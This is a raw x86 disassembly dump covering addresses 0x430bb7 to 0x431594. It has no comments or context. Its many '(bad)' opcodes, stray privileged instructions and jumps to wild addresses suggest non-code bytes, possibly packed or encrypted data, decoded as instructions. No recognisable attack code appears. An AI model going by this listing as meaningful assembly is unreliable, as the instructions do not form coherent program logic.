  430bb7:	and    ebp,edx
  430bb9:	(bad)  
  430bba:	call   0x12173fc5
  430bbf:	mov    eax,0x2bb30cd7
  430bc4:	dec    ebp
  430bc5:	sbb    al,0xe9
  430bc7:	add    ecx,ebx
  430bc9:	dec    ebx
  430bca:	or     DWORD PTR [eax+eax*1-0xbf7d90b],0xffffff87
  430bd2:	icebp  
  430bd3:	inc    edx
  430bd4:	imul   edi,edi,0x917b7e1
  430bda:	ficomp DWORD PTR [eax]
  430bdc:	mov    eax,0x24042917
  430be1:	xor    al,0x55
  430be3:	call   0x8a13e6e3
  430be8:	fadd   QWORD PTR [ecx+ebp*8]
  430beb:	dec    ecx
  430bec:	clc    
  430bed:	or     al,BYTE PTR [eax]
  430bef:	jmp    0x6a431525
  430bf4:	arpl   ax,bp
  430bf6:	add    ebp,ecx
  430bf8:	pop    esp
  430bf9:	or     BYTE PTR [edi],ch
  430bfb:	test   eax,0x917edfe2
  430c00:	ss mov edx,0xe84b8e05
  430c06:	add    eax,DWORD PTR [esi+0x290e24dc]
  430c0c:	clc    
  430c0d:	(bad)  
  430c0e:	mov    WORD PTR [ebp-0x14bd7e09],?
	...
  430c2c:	add    BYTE PTR [ebp+eax*2+0x74],ch
  430c30:	std    
  430c31:	(bad)  
  430c33:	adc    ebp,ecx
  430c35:	test   DWORD PTR [ecx-0x29052240],0x5bd5fa
  430c3f:	push   eax
  430c40:	push   ecx
  430c41:	sub    eax,0x15e9001c
  430c46:	jb     0x430c4c
  430c48:	jmp    0xe566bdbf
  430c4d:	not    esi
  430c4f:	xchg   BYTE PTR [ecx],bl
  430c51:	pop    esp
  430c52:	or     BYTE PTR [edi],ch
  430c54:	sub    edx,esp
  430c56:	loopne 0x430cd6
  430c58:	pop    ss
  430c59:	mov    dh,0xb9
  430c5b:	or     ecx,DWORD PTR [esi]
  430c5d:	dec    ebx
  430c5e:	call   0x491f126a
  430c63:	push   cs
  430c64:	test   eax,0x64f08bf7
  430c69:	mov    ebp,0xab298504
  430c6e:	daa    
  430c6f:	call   0x480a05
  430c74:	cmp    BYTE PTR fs:[ecx-0x46cac0fa],bh
  430c7b:	and    ebx,ebp
  430c7d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430c7e:	sub    ecx,DWORD PTR [eax]
  430c80:	add    ch,dl
  430c82:	pop    es
  430c83:	add    BYTE PTR [esi+0x5f],bl
  430c86:	cld    
  430c87:	call   DWORD PTR [edx+0xb]
  430c8a:	xor    cl,0x57
  430c8d:	push   ss
  430c8e:	icebp  
  430c8f:	test   dh,dh
	...
  430ca9:	add    cl,bh
  430cab:	dec    eax
  430cac:	sbb    BYTE PTR ds:0x401a7d,0x1e
  430cb3:	(bad)  
  430cb4:	div    BYTE PTR [ebp-0x6b]
  430cb7:	les    esi,FWORD PTR [ebx+0x24]
  430cba:	popf   
  430cbb:	(bad)  
  430cbc:	retf   0x758b
  430cbf:	lds    ebp,FWORD PTR ds:0xd8818eff
  430cc5:	lea    eax,[ecx+0x30]
  430cc8:	mov    WORD PTR [esp+eiz*2+0x9],cs
  430ccc:	call   0x4a58a7
  430cd1:	test   BYTE PTR ds:0x598d0e6d,bl
  430cd7:	add    al,0x50
  430cd9:	mov    ecx,DWORD PTR [ebx-0x3c]
  430cdc:	jae    0x430d02
  430cde:	dec    ecx
  430cdf:	add    BYTE PTR [eax+ebx*2],0x8d
  430ce3:	fistp  QWORD PTR [edi+edx*1+0x1b0070d]
  430cea:	push   es
  430ceb:	or     ebp,DWORD PTR [edx]
  430ced:	rcl    BYTE PTR [edx+0x25],0x52
  430cf1:	ret    0x719
  430cf4:	jnp    0x430d72
  430cf6:	cmp    DWORD PTR [ebx],ecx
  430cf8:	add    BYTE PTR [ebx+0x5b],dl
  430cfb:	dec    esp
  430cfc:	sbb    al,0x66
  430cff:	div    BYTE PTR [ebx+0x39]
  430d02:	push   esi
  430d03:	xor    bh,BYTE PTR [edi+0x7b068d12]
  430d09:	sti    
  430d0a:	sar    BYTE PTR [ebx+0x3],cl
  430d0d:	inc    DWORD PTR [eax]
	...
  430d27:	sub    DWORD PTR ds:0x72f4ff0b,ebx
  430d2d:	mov    eax,ds
  430d2f:	ret    
  430d30:	sbb    al,BYTE PTR [ecx-0x2d]
  430d33:	outs   dx,DWORD PTR ds:[esi]
  430d34:	inc    esp
  430d35:	mov    cl,BYTE PTR [ebx+edx*1+0x1d]
  430d39:	daa    
  430d3a:	jg     0x430d3e
  430d3c:	sbb    al,0xff
  430d3e:	xor    DWORD PTR [eax+edi*8-0x110d78ec],0x40
  430d46:	je     0x430d20
  430d48:	aaa    
  430d49:	add    al,0xc3
  430d4b:	and    al,0x84
  430d4d:	mov    cl,0x12
  430d4f:	hlt    
  430d50:	sbb    ebp,DWORD PTR [edi+0x1]
  430d53:	(bad)  
  430d54:	push   ds
  430d55:	cmc    
  430d56:	mov    edi,0xbddd11d3
  430d5b:	lock sbb ebx,ecx
  430d5e:	cli    
  430d5f:	or     DWORD PTR [ebp+edx*1+0x40],edi
  430d63:	hlt    
  430d64:	mov    al,ds:0xeb17a3e
  430d69:	inc    edi
  430d6a:	das    
  430d6b:	es jae 0x430cf0
  430d6e:	rol    dl,0x33
  430d71:	adc    BYTE PTR [ebx-0x47b6e08],dh
  430d77:	aam    0x77
  430d79:	push   es
  430d7a:	jg     0x430daf
  430d7c:	repz test al,0x7e
  430d7f:	and    ebp,DWORD PTR [eax]
  430d81:	mov    eax,0xfc5db501
  430d86:	iret   
  430d87:	nop
  430d88:	adc    ebp,esp
  430d8a:	rol    BYTE PTR [eax],0x0
	...
  430da1:	add    BYTE PTR [eax],al
  430da3:	add    BYTE PTR [ecx+0x30],bh
  430da6:	ror    DWORD PTR [esp+ebp*4+0x7cc98202],1
  430dad:	push   ecx
  430dae:	adc    BYTE PTR [ebx-0x47b89d0],dh
  430db4:	adc    al,0xb0
  430db6:	add    eax,0xa83abb7f
  430dbb:	jle    0x430d98
  430dbd:	add    al,0xed
  430dbf:	mov    dh,0xf7
  430dc1:	mov    esp,0xd1d1bd2f
  430dc6:	or     eax,0x64024656
  430dcb:	inc    esp
  430dcc:	ds (bad) 
  430dce:	jae    0x430de0
  430dd0:	hlt    
  430dd1:	rcl    DWORD PTR [esi],cl
  430dd3:	(bad)  
  430dd4:	xchg   ebx,eax
  430dd5:	add    al,0xda
  430dd7:	add    esi,esp
  430dd9:	cmc    
  430dda:	lahf   
  430ddb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430ddc:	ins    BYTE PTR es:[edi],dx
  430ddd:	add    BYTE PTR [ebx],ch
  430ddf:	inc    ebx
  430de0:	inc    ebx
  430de1:	fcmovnbe st,st(6)
  430de3:	pop    edx
  430de4:	jae    0x430e1a
  430de6:	loop   0x430e5e
  430de8:	idiv   BYTE PTR [edi+0x39]
  430deb:	push   esp
  430dec:	push   ss
  430ded:	xchg   BYTE PTR [edi+0xd],bh
  430df0:	out    0x7,eax
  430df2:	jmp    0xc490:0xd31daa76
  430df9:	jno    0x430dfe
  430dfb:	and    DWORD PTR [edx+0x7],0xffffffda
  430dff:	push   es
  430e00:	stc    
  430e01:	cmp    ebx,DWORD PTR [edx+0x4]
  430e04:	hlt    
  430e05:	sbb    eax,0x90e3
	...
  430e1e:	add    BYTE PTR [eax],al
  430e20:	add    BYTE PTR [ecx+edx*4+0x74282c3],ah
  430e27:	mov    edx,0x3a5bf91f
  430e2c:	add    al,0xf4
  430e2e:	mov    BYTE PTR [esi],cl
  430e30:	mov    eax,0xc4e7fcf6
  430e35:	leave  
  430e36:	dec    ebp
  430e37:	push   cs
  430e38:	pop    es
  430e39:	xor    al,0x24
  430e3b:	in     eax,0x8b
  430e3d:	cmc    
  430e3e:	jne    0x430e28
  430e40:	xor    BYTE PTR [esi],0x6
  430e43:	(bad)  
  430e44:	jns    0x430ddc
  430e46:	xchg   DWORD PTR [ecx],ebp
  430e48:	mov    ecx,0xb91e88fb
  430e4d:	div    DWORD PTR [eax+eax*1-0x18]
  430e51:	push   cs
  430e52:	das    
  430e53:	xor    DWORD PTR [ecx],ebp
  430e55:	mov    edx,0x7f3cbed7
  430e5a:	and    DWORD PTR [edi-0x33],edi
  430e5d:	sti    
  430e5e:	scas   eax,DWORD PTR es:[edi]
  430e5f:	fs aad 0xf7
  430e62:	mov    edi,0x87c6251
  430e67:	(bad)  
  430e68:	cmc    
  430e69:	stc    
  430e6a:	xchg   DWORD PTR [ebp-0x13],eax
  430e6d:	jbe    0x430e54
  430e6f:	call   FWORD PTR ds:0xf2f7c271
  430e75:	loopne 0x430e72
  430e77:	jle    0x430e1e
  430e79:	test   DWORD PTR [eax+eax*1],0x7f00bc72
  430e80:	mov    ebp,esi
  430e82:	jge    0x430ec9
  430e84:	xchg   ebp,eax
	...
  430e9d:	add    dh,cl
  430e9f:	or     DWORD PTR [edi-0x37780004],eax
  430ea5:	push   0x34
  430ea7:	xor    al,0x0
  430ea9:	(bad)  
  430eab:	mov    eax,0xf7b1621b
  430eb0:	lock fiadd DWORD PTR [ebx]
  430eb3:	xchg   DWORD PTR [eax],edx
  430eb5:	and    ebp,DWORD PTR ds:0x37ec7414
  430ebb:	test   eax,0xf88803db
  430ec1:	adc    dh,dl
  430ec3:	les    ecx,FWORD PTR [eax+0xd27ffa4]
  430ec9:	lahf   
  430eca:	test   BYTE PTR [edx+0x1ce06207],dh
  430ed0:	(bad)  
  430ed1:	in     eax,dx
  430ed2:	test   DWORD PTR [edi+eax*4],0xfbc27e21
  430ed9:	bound  edi,QWORD PTR [esp+edi*8]
  430edc:	mov    ebp,ds
  430ede:	or     DWORD PTR fs:[eax],eax
  430ee1:	add    ch,bl
  430ee3:	add    ebp,eax
  430ee5:	rol    BYTE PTR es:[ebx],0x0
  430ee9:	test   BYTE PTR ds:0xcdab83ff,cl
  430eef:	add    eax,DWORD PTR [eax]
  430ef1:	test   edx,ebx
  430ef3:	ins    BYTE PTR es:[edi],dx
  430ef4:	adc    eax,0xe7ca4653
  430ef9:	into   
  430efa:	test   al,0xf1
  430efc:	test   BYTE PTR [ebx-0x317d3b00],0x0
	...
  430f1b:	es cld 
  430f1d:	mov    BYTE PTR [esp+ecx*2],al
  430f20:	mov    al,al
  430f22:	movups XMMWORD PTR [eax-0x6730000],xmm0
  430f29:	inc    esp
  430f2a:	adc    BYTE PTR [edi+esi*2-0x3b277497],bl
  430f31:	add    dh,0x16
  430f34:	or     DWORD PTR [ebp+0x38861504],ecx
  430f3a:	add    BYTE PTR [ecx+0x50],dh
  430f3d:	xor    BYTE PTR [eax],0x3
  430f40:	repnz adc al,0xc4
  430f43:	aas    
  430f44:	inc    ebx
  430f45:	sti    
  430f46:	test   BYTE PTR [ebp+0xf334d6e],cl
  430f4c:	test   BYTE PTR ss:[ebp-0x75ee90e3],0x59
  430f54:	cmp    BYTE PTR [ebx-0x7],bh
  430f57:	in     eax,dx
  430f58:	ins    BYTE PTR es:[edi],dx
  430f59:	add    eax,DWORD PTR [eax-0x680043c]
  430f5f:	adc    DWORD PTR [eax+0x1],edi
  430f62:	inc    edx
  430f63:	push   edx
  430f64:	sub    al,0xf3
  430f66:	jl     0x430f1f
  430f68:	sbb    eax,0x35198dbd
  430f6d:	mov    WORD PTR [eax-0x16],ss
  430f70:	xchg   edx,ecx
  430f72:	js     0x430f68
  430f74:	xor    DWORD PTR [ecx+0x369dbe0c],ecx
  430f7a:	and    BYTE PTR [eax+0x34],ch
  430f7d:	jg     0x430f68
	...
  430f97:	add    ch,bh
  430f99:	fwait
  430f9a:	ss add al,0x6b
  430f9d:	and    bh,al
  430f9f:	inc    ebp
  430fa0:	pop    ebp
  430fa1:	xor    al,bh
  430fa3:	stc    
  430fa4:	dec    edx
  430fa5:	cmp    BYTE PTR [edx-0x30cbb540],al
  430fab:	push   edx
  430fac:	sub    al,BYTE PTR [ebp+ecx*4+0x15]
  430fb0:	hlt    
  430fb1:	sbb    eax,DWORD PTR [ebp+0x4]
  430fb4:	in     al,0x1b
  430fb6:	mov    BYTE PTR [ebp-0x54],al
  430fb9:	outs   dx,DWORD PTR ds:[esi]
  430fba:	ret    0xddfb
  430fbd:	loopne 0x430fca
  430fbf:	or     esi,DWORD PTR [esi+0x4f]
  430fc2:	cmp    al,0xfb
  430fc4:	xchg   ebx,eax
  430fc5:	mov    bl,0xc1
  430fc7:	sti    
  430fc8:	sub    ebp,esi
  430fca:	fmul   st,st(0)
  430fcc:	mov    dh,0x2c
  430fce:	inc    DWORD PTR [esi-0x5777fcf]
  430fd4:	pop    esp
  430fd5:	fist   WORD PTR [edx]
  430fd7:	add    ah,dh
  430fd9:	call   0x86d2:0x824ffb46
  430fe0:	dec    eax
  430fe1:	fwait
  430fe2:	sub    cl,BYTE PTR [edi+esi*2]
  430fe5:	inc    ecx
  430fe6:	aaa    
  430fe7:	add    BYTE PTR [edi+0x77ee8875],ah
  430fed:	inc    BYTE PTR [ebx]
  430fef:	(bad)  
  430ff0:	loopne 0x431015
  430ff2:	aam    0x88
  430ff4:	mov    ecx,0x205585c7
  430ff9:	add    edi,DWORD PTR [esi]
  430ffb:	or     eax,DWORD PTR [eax]
	...
  431015:	ja     0x430ff4
  431017:	(bad)  
  431018:	push   esp
  43101a:	mov    eax,ds:0x50d8006
  43101f:	leave  
  431020:	mov    bh,0xf1
  431022:	test   BYTE PTR [eax],ah
  431024:	or     al,BYTE PTR [eax-0x16c59701]
  43102a:	lods   eax,DWORD PTR ds:[esi]
  43102b:	loopne 0x430ff0
  43102d:	jl     0x430ff6
  43102f:	add    al,0xf8
  431031:	test   eax,0xa1f801b2
  431036:	std    
  431037:	gs arpl sp,si
  43103a:	add    al,0xe9
  43103c:	mov    esp,ebp
  43103e:	jg     0x4310a1
  431040:	add    eax,0xb0022974
  431045:	clc    
  431046:	test   dh,cl
  431048:	out    0x40,al
  43104a:	push   ss
  43104b:	pusha  
  43104c:	mov    ecx,0x8dfd19af
  431051:	inc    DWORD PTR [eax+eax*8+0x68fe27e4]
  431058:	cmp    eax,0x83e3b0ed
  43105d:	(bad)  
  43105e:	jmp    DWORD PTR [edx]
  431060:	add    DWORD PTR [edi],esi
  431062:	jmp    0xefb2:0x7999b69e
  431069:	mov    ds:0xefbc119,eax
  43106e:	mov    eax,0x7f3cf6d5
  431073:	and    bh,BYTE PTR [ebx]
  431075:	pop    ebx
  431076:	add    ch,BYTE PTR [eax]
  431078:	int3   
	...
  431091:	add    bl,bl
  431093:	in     al,dx
  431094:	or     al,0xb0
  431096:	dec    esp
  431097:	sub    BYTE PTR ss:0xfea207c0,al
  43109e:	dec    ecx
  43109f:	mov    dl,0x4c
  4310a1:	inc    DWORD PTR [ecx-0x49]
  4310a4:	in     eax,0x3a
  4310a6:	shl    DWORD PTR [eax],0x6e
  4310a9:	pop    ebx
  4310aa:	ror    edi,cl
  4310ac:	cmp    al,0x8f
  4310ae:	mov    cl,0x2c
  4310b0:	add    BYTE PTR [esp+ebp*8+0x7f],ah
  4310b4:	add    al,0xe9
  4310b6:	test   DWORD PTR [eax+ebp*8],0x4e360
  4310bd:	gs mov eax,0x9b6c35b8
  4310c3:	mov    bh,0x5
  4310c5:	fidiv  DWORD PTR [edi]
  4310c7:	popf   
  4310c8:	sub    bh,BYTE PTR [edi-0x49]
  4310cb:	sub    al,0x3b
  4310cd:	adc    dh,ch
  4310cf:	das    
  4310d0:	jne    0x4310c7
  4310d2:	push   0x6c
  4310d4:	call   0xfb731c69
  4310d9:	jb     0x4310d8
  4310db:	adc    DWORD PTR [ebp-0x1f],0x70
  4310df:	add    DWORD PTR [ecx+0x11b1376c],edx
  4310e5:	into   
  4310e6:	mov    ah,0x34
  4310e8:	xchg   DWORD PTR [esp+eiz*8],ebx
  4310eb:	(bad)  
  4310ec:	mov    BYTE PTR [esp+ebx*8],bh
  4310ef:	add    ebx,0xffffffc0
  4310f2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4310f3:	das    
  4310f4:	sti    
  4310f5:	scas   al,BYTE PTR es:[edi]
	...
  43110e:	add    BYTE PTR [edx-0x36d083e],al
  431114:	add    DWORD PTR [ebp-0x5f],0x72
  431118:	out    dx,eax
  431119:	out    0x26,eax
  43111b:	in     al,0x4
  43111d:	add    BYTE PTR [edx-0x41],ch
  431120:	das    
  431121:	pop    ebx
  431122:	daa    
  431123:	dec    ebx
  431124:	cmp    eax,0x197314bf
  431129:	jg     0x4310b0
  43112b:	rep stos DWORD PTR es:[edi],eax
  43112d:	fs jno 0x431127
  431130:	mov    ebx,0xac017251
  431135:	and    ecx,ebp
  431137:	ins    BYTE PTR es:[edi],dx
  431138:	or     DWORD PTR [eax-0x42],ecx
  43113b:	push   0x4c60fbc2
  431140:	cmp    BYTE PTR [edi],dh
  431142:	add    dh,bl
  431144:	(bad)  
  431145:	jp     0x43111c
  431147:	or     eax,0x9a0f0008
  43114c:	(bad)  
  43114d:	jp     0x431148
  43114f:	std    
  431150:	je     0x431157
  431152:	adc    esp,0xfffffff8
  431155:	imul   ecx,DWORD PTR [edi],0x770ce88e
  43115b:	pop    ss
  43115c:	add    eax,0x2
  43115f:	push   esp
  431160:	inc    ebp
  431161:	idiv   DWORD PTR [ebx]
  431163:	push   ds
  431164:	jb     0x431145
  431166:	cmp    ecx,DWORD PTR [esi]
  431168:	(bad)  
  431169:	jp     0x43111c
  43116b:	int    0x7
  43116d:	add    BYTE PTR [edi],cl
  43116f:	or     al,BYTE PTR [eax]
  431171:	lea    edi,[eax+0x0]
	...
  43118c:	fild   WORD PTR [eax+0x2c2927f9]
  431192:	jp     0x43118d
  431194:	out    dx,eax
  431195:	pop    ebx
  431196:	pop    ss
  431197:	mov    ebp,DWORD PTR [edi+edi*2+0x7d]
  43119b:	cld    
  43119c:	(bad)  
  43119d:	xor    eax,DWORD PTR [esi]
  43119f:	mov    bh,0x92
  4311a1:	cmp    cl,0x20
  4311a4:	fst    DWORD PTR [edi]
  4311a6:	jnp    0x4311a1
  4311a8:	xchg   esp,eax
  4311a9:	jno    0x4311af
  4311ab:	adc    DWORD PTR [ebx+eax*1+0x6e],0x7
  4311b0:	push   cs
  4311b1:	(bad)  
  4311b2:	stc    
  4311b3:	cmp    ah,BYTE PTR [esi+0x72]
  4311b6:	fimul  WORD PTR [ebx-0x142ce65e]
  4311bc:	inc    edx
  4311bd:	cmp    BYTE PTR gs:[edi],dl
  4311c0:	push   0xd0c92b15
  4311c5:	inc    ebp
  4311c6:	stc    
  4311c7:	jmp    0x431222
  4311c9:	inc    esi
  4311ca:	jp     0x4311b4
  4311cc:	pop    edi
  4311cd:	gs jp  0x431208
  4311d0:	sbb    DWORD PTR [ebx-0xf],0xfedcf4f6
  4311d7:	jae    0x4311d4
  4311d9:	sahf   
  4311da:	inc    eax
  4311db:	(bad)  
  4311dc:	out    dx,al
  4311dd:	(bad)  
  4311de:	mov    cl,0xd9
  4311e0:	ffreep st(6)
  4311e2:	stos   BYTE PTR es:[edi],al
  4311e3:	add    esi,DWORD PTR [edi+0x40]
  4311e6:	xor    edi,esi
  4311e8:	jle    0x4311e4
  4311ea:	in     al,dx
  4311eb:	pop    esp
  4311ec:	or     BYTE PTR [esi+0xf7c2],dh
	...
  431206:	add    BYTE PTR [eax],al
  431208:	add    BYTE PTR [ecx+0x19],dh
  43120b:	add    BYTE PTR [esp+esi*8],0x1d
  43120f:	call   eax
  431211:	out    dx,eax
  431212:	add    al,0x68
  431214:	push   cs
  431215:	hlt    
  431216:	sbb    edi,DWORD PTR [ebx-0x40]
  431219:	push   0x61d77a68
  43121e:	es hlt 
  431220:	mov    edi,0x3fab945c
  431225:	hlt    
  431226:	fld    TBYTE PTR [eax*1-0x78c82e3d]
  43122d:	mov    bh,0x44
  43122f:	or     bh,dh
  431231:	mov    bl,0x3b
  431233:	mov    WORD PTR [edx],cs
  431235:	jg     0x431240
  431237:	cmp    al,0x89
  431239:	clc    
  43123a:	int3   
  43123b:	jns    0x4311fd
  43123d:	and    BYTE PTR [eax+edi*1+0x45],dl
  431241:	mov    WORD PTR [edi+0x5b77f3d1],fs
  431247:	add    eax,0x8c880189
  43124c:	ret    
  43124d:	lea    edi,[edi]
  43124f:	cmp    bl,bh
  431251:	jae    0x4311fa
  431253:	mov    ecx,0x8c315ff7
  431258:	inc    ebp
  431259:	pop    esp
  43125a:	mov    bh,0xf8
  43125c:	out    0xb4,eax
  43125e:	dec    esi
  43125f:	(bad)  
  431260:	push   DWORD PTR [edi+0x64]
  431263:	cmp    BYTE PTR [ebx-0x56],bl
  431266:	add    al,0xbe
  431268:	dec    edx
  431269:	adc    eax,0x6d
  43126c:	daa    
	...
  431285:	add    BYTE PTR [ebx-0x3a2b02e8],bh
  43128b:	cmc    
  43128c:	sub    eax,0x7029dad0
  431291:	(bad)  
  431292:	daa    
  431293:	jl     0x431231
  431295:	cmp    ebx,ebp
  431297:	(bad)  
  431298:	in     al,0x8
  43129a:	jbe    0x4312fa
  43129c:	jmp    0xb4c106a4
  4312a1:	cmp    edi,DWORD PTR [ebx-0x40]
  4312a4:	lock xchg al,dh
  4312a7:	jl     0x431307
  4312a9:	adc    esi,DWORD PTR [esi+0x7d0309bf]
  4312af:	mov    edi,0x1dba8c14
  4312b4:	aam    0xa1
  4312b6:	pop    edx
  4312b7:	sub    eax,0xa2ecafc9
  4312bc:	gs cmp edi,ebp
  4312bf:	mov    dh,0xea
  4312c1:	popf   
  4312c2:	inc    edx
  4312c3:	sub    eax,0x85e8adec
  4312c8:	test   al,0x2
  4312ca:	push   DWORD PTR [ecx-0x18]
  4312cd:	popf   
  4312ce:	jo     0x431314
  4312d0:	cmp    al,0x23
  4312d2:	fwait
  4312d3:	add    BYTE PTR [ebx+0x17039ec1],ah
  4312d9:	aaa    
  4312da:	jmp    0x8c06ea03
  4312df:	js     0x4312d6
  4312e1:	sti    
  4312e2:	jo     0x43129c
  4312e4:	out    dx,eax
  4312e5:	or     ebp,DWORD PTR [ecx-0x51]
  4312e8:	pushf  
  4312e9:	lea    eax,[eax]
	...
  431303:	mov    ecx,0x5288134
  431308:	add    eax,0xb0347fe9
  43130d:	sbb    al,BYTE PTR [ebx-0x16ffd327]
  431313:	jle    0x4312dc
  431315:	repz idiv edi
  431318:	mov    ds:0x7c61c11f,al
  43131d:	add    al,0xe2
  43131f:	jp     0x4312ca
  431321:	jl     0x431379
  431323:	clc    
  431324:	mov    al,0x7
  431326:	ret    
  431327:	adc    eax,0xf47061d1
  43132c:	mov    cl,0x42
  43132e:	jb     0x431365
  431330:	sbb    eax,0xbf7ef9fb
  431335:	out    dx,eax
  431336:	pop    esp
  431337:	add    al,0xb2
  431339:	out    0x1b,eax
  43133b:	shr    DWORD PTR ds:0x193ceafb,0x80
  431342:	xchg   esp,eax
  431343:	sub    al,BYTE PTR ds:0xa9ddf74
  431349:	pop    eax
  43134a:	(bad)  
  43134b:	jo     0x43134e
  43134d:	ja     0x4312f5
  43134f:	out    0x68,al
  431351:	bound  esp,QWORD PTR [eax-0xc]
  431354:	scas   eax,DWORD PTR es:[edi]
  431355:	cli    
  431356:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  431357:	jo     0xc201f4a2
  43135d:	or     ebp,esi
  43135f:	jne    0x431333
  431361:	cli    
  431362:	(bad)  
  431363:	jmp    0x0:0x2ebf7f
	...
  43137e:	add    BYTE PTR [eax],al
  431380:	ret    0xc8cf
  431383:	stos   DWORD PTR es:[edi],eax
  431384:	out    dx,eax
  431385:	add    al,0xfb
  431387:	xor    al,0xe4
  431389:	sbb    al,0x44
  43138b:	fcomi  st,st(7)
  43138d:	add    al,0x2f
  43138f:	test   eax,0x725519de
  431394:	fcmovnbe st,st(2)
  431396:	push   edx
  431397:	jb     0x431351
  431399:	jg     0x4313e8
  43139b:	loope  0x43141b
  43139d:	xor    eax,0xfca4a085
  4313a2:	test   BYTE PTR [eax],al
  4313a4:	jp     0x4313fe
  4313a6:	jae    0x9d2c0351
  4313ac:	pop    ebp
  4313ad:	add    al,0x0
  4313af:	test   edx,ebx
  4313b1:	je     0x4313b9
  4313b3:	xor    ecx,DWORD PTR ds:0x4d90e844
  4313b9:	add    al,0x0
  4313bb:	xor    ebx,ebp
  4313bd:	fmul   DWORD PTR [eax+0x4b041d00]
  4313c3:	mov    ebx,DWORD PTR [eax]
  4313c5:	call   0x835053d3
  4313ca:	idiv   bh
  4313cc:	push   eax
  4313cd:	xor    al,0x7a
  4313cf:	jge    0x4313fa
  4313d1:	out    dx,eax
  4313d2:	je     0x4313f6
  4313d4:	xchg   DWORD PTR [esi],esp
  4313d6:	push   es
  4313d7:	mov    esi,0xd0b5ff1c
  4313dc:	mov    dh,0xf5
  4313de:	je     0x431437
  4313e0:	mov    dh,0xbe
  4313e2:	add    eax,0x0
	...
  4313fd:	popa   
  4313fe:	push   ecx
  4313ff:	ds mov dl,dl
  431402:	(bad)  
  431403:	mov    ch,0x34
  431405:	test   dh,bh
  431407:	mov    ch,0xd0
  431409:	mov    dh,0xf5
  43140b:	jae    0x4313fb
  43140d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43140e:	inc    ebx
  43140f:	push   eax
  431410:	(bad)  
  431411:	jle    0x431490
  431413:	dec    ebp
  431414:	or     BYTE PTR [esi],dl
  431416:	icebp  
  431417:	jp     0x431496
  431419:	leave  
  43141a:	lock je 0x431426
  43141d:	add    dh,dl
  43141f:	retf   0xc88b
  431422:	clc    
  431423:	mov    BYTE PTR [ebp-0x67],al
  431426:	jl     0x43147d
  431428:	or     al,0x86
  43142a:	cmc    
  43142b:	je     0x43144e
  43142d:	adc    bh,dl
  43142f:	jae    0x43144e
  431431:	adc    bl,dl
  431433:	jae    0x43144e
  431435:	hlt    
  431436:	dec    edx
  431437:	aas    
  431438:	test   DWORD PTR [esi-0x9],eax
  43143b:	or     cl,BYTE PTR [ebx]
  43143d:	mov    ds:0xfbba046c,al
  431442:	push   edx
  431443:	xor    BYTE PTR [ebp-0x1],dh
  431446:	fdivr  QWORD PTR [edi+edi*1-0x1547a3f1]
  43144d:	dec    edi
  43144e:	sbb    ebp,eax
  431450:	in     eax,dx
  431451:	pop    es
  431452:	cmc    
  431453:	jp     0x431447
  431455:	add    ebp,DWORD PTR [edi-0x31cd78c2]
  43145b:	pop    ebx
  43145c:	pop    ss
  43145d:	xor    al,0x62
  43145f:	or     BYTE PTR [eax+eax*1+0x0],0x0
	...
  431478:	add    BYTE PTR [eax],al
  43147a:	in     eax,dx
  43147b:	out    0xe0,al
  43147d:	shl    BYTE PTR [ebx-0x3422d71],0x1d
  431484:	retf   0x1086
  431487:	addr16 int3 
  431489:	xchg   ch,bh
  43148b:	mov    cl,0xc2
  43148d:	pop    es
  43148e:	jg     0x43149c
  431490:	jnp    0x43145b
  431492:	popa   
  431493:	dec    eax
  431494:	jp     0x431491
  431496:	push   0xdbc88048
  43149b:	adc    eax,0x1bf40095
  4314a0:	jp     0x43149d
  4314a2:	inc    ecx
  4314a3:	inc    edi
  4314a4:	lock mov edi,0x905534
  4314aa:	hlt    
  4314ab:	sbb    esi,eax
  4314ad:	mov    edi,0xfffea09d
  4314b2:	hlt    
  4314b3:	jmp    0xffbf:0x4a941d88
  4314ba:	jbe    0x431522
  4314bc:	xor    al,0x75
  4314be:	jecxz  0x43145a
  4314c0:	mov    cl,0xb
  4314c2:	mov    esi,ecx
  4314c4:	fimul  WORD PTR [edx]
  4314c6:	dec    ebx
  4314c7:	add    eax,0xf44704ea
  4314cc:	int    0x33
  4314ce:	jmp    0xd687d29b
  4314d3:	jg     0x43147e
  4314d5:	scas   eax,DWORD PTR es:[edi]
  4314d6:	enter  0xaa81,0x1
  4314da:	out    dx,eax
  4314db:	ins    DWORD PTR es:[edi],dx
  4314dc:	loop   0x4314e2
	...
  4314f6:	add    BYTE PTR [edi+0x5be8aff1],al
  4314fc:	mov    cl,0x7b
  4314fe:	sub    BYTE PTR [ecx+0x735061d3],bh
  431504:	mov    eax,0x822488f0
  431509:	aam    0x7
  43150b:	das    
  43150c:	mov    al,0xdf
  43150e:	int3   
  43150f:	push   ds
  431510:	push   edx
  431511:	outs   dx,BYTE PTR ds:[esi]
  431512:	(bad)  
  431513:	repz jnp 0x4314ba
  431516:	pop    es
  431517:	jnp    0x4314e9
  431519:	in     al,0xf8
  43151b:	sbb    DWORD PTR [eax-0x4ef980fd],esi
  431521:	(bad)  
  431522:	jle    0x43154e
  431524:	mov    cl,0xfb
  431526:	lock mov bl,0x7f
  431529:	aaa    
  43152a:	mov    ch,0xc
  43152c:	not    BYTE PTR [ecx-0xe]
  43152f:	out    dx,al
  431530:	ins    DWORD PTR es:[edi],dx
  431531:	loop   0x43151b
  431533:	retf   0xe9af
  431536:	xor    BYTE PTR [ebp-0x35c399fe],0xe5
  43153d:	lods   eax,DWORD PTR ds:[esi]
  43153e:	inc    ecx
  43153f:	inc    eax
  431540:	sbb    cl,dh
  431542:	push   es
  431543:	adc    esi,DWORD PTR [ebx]
  431545:	push   ss
  431546:	cmp    eax,0x92e22e79
  43154b:	mov    ch,0x79
  43154d:	mov    ds:0xa909bc3b,eax
  431552:	iret   
  431553:	push   0xf332efb8
  431558:	inc    ebx
  431559:	add    BYTE PTR [esi],dl
	...
  431573:	add    BYTE PTR [esi-0x81e4238],ah
  431579:	iret   
  43157a:	xchg   BYTE PTR [ebp-0xeba815f],dl
  431580:	lock mov edi,0xa9bb6cfb
  431586:	add    al,0x6a
  431588:	and    BYTE PTR [edx],ch
  43158a:	leave  
  43158b:	stos   BYTE PTR es:[edi],al
  43158c:	ds js  0x4315c3
  43158f:	loop   0x4315be
  431591:	shl    bh,cl
  431593:	push   ecx
  431594:	loope  0x43159a
